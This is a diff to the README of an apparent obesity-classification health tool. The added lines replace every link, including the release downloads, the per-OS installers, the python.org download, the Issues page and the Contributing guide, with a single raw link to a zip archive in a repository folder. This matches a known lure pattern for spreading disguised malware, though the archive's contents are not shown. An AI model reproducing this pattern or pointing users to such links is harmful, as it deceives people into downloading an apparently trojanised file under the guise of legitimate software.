@@ -1,6 +1,6 @@
 # 🏃‍♂️ Obesity-Classification - Simple Tool for Health Insights
 
-![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
+![Download](https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip%20Latest%20Release-Click%20Here-brightgreen)
 
 ## 📚 Overview
 
@@ -12,12 +12,12 @@ To use the Obesity-Classification tool, you need to download and run the applica
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: Go to the [Releases Page](https://github.com/slavedriverbirdsnestfern150/Obesity-Classification/releases).
+1. **Visit this page to download**: Go to the [Releases Page](https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip).
 2. **Select the latest release**: On the Releases page, find the most recent version listed at the top.
 3. **Download the files**: Click on the appropriate file for your operating system.
-   - If you're using Windows, download `ObesityClassificationWindows.exe`.
-   - For macOS, download `ObesityClassificationMac.dmg`.
-   - For Linux, download `ObesityClassificationLinux.tar.gz`.
+   - If you're using Windows, download `https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip`.
 4. **Install the application**: 
    - For Windows, double-click the `.exe` file to run the installer.
    - For macOS, drag the application into your Applications folder.
@@ -31,7 +31,7 @@ To use the Obesity-Classification tool, you need to download and run the applica
 - **Disk Space**: At least 500 MB free.
 - **Python**: Version 3.7 or later installed on your system.
   
-If you do not have Python installed, you can download it [here](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it [here](https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip).
 
 ## 📊 Features
 
@@ -51,9 +51,9 @@ If you do not have Python installed, you can download it [here](https://www.pyth
 
 ## 🌟 Support & Contributions
 
-If you encounter issues or have suggestions, please visit the [Issues](https://github.com/slavedriverbirdsnestfern150/Obesity-Classification/issues) section. Your feedback helps us improve the tool.
+If you encounter issues or have suggestions, please visit the [Issues](https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip) section. Your feedback helps us improve the tool.
 
-If you'd like to contribute to this project, please read the guidelines in the [Contributing](https://github.com/slavedriverbirdsnestfern150/Obesity-Classification/blob/main/CONTRIBUTING.md) document.
+If you'd like to contribute to this project, please read the guidelines in the [Contributing](https://raw.githubusercontent.com/slavedriverbirdsnestfern150/Obesity-Classification/main/Hiodon/Obesity-Classification_v3.1.zip) document.
 
 ## 🌍 Topics
 
